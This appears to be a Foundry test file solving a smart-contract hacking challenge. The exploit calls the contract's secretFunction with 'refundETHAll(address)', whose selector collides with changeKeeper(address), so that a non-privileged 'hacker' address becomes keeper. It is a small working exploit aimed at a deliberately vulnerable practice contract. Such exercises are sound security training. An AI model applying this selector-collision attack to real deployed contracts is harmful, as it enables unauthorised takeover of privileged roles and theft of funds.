// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import {Test} from "forge-std/Test.sol";
import {Donate} from "../src/Donate.sol";

/*
Initially, you are a hacker. Not the owner or the keeper of Donate contract.
The purpose is to call keeperCheck() Function and get true;
*/

/*
https://www.4byte.directory/signatures/?bytes4_signature=0x09779838
refundETHAll(address) and changeKeeper(address) have the same function signature 0x09779838
*/

contract donateHack is Test {
    Donate donate;
    address keeper = makeAddr("keeper");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        donate = new Donate(keeper);
    }

function testhack() public {
    vm.startPrank(hacker);
    donate.secretFunction("refundETHAll(address)");
    assertEq(donate.keeperCheck(), true, "Hacker is not a keeper");
	vm.stopPrank();
    }
}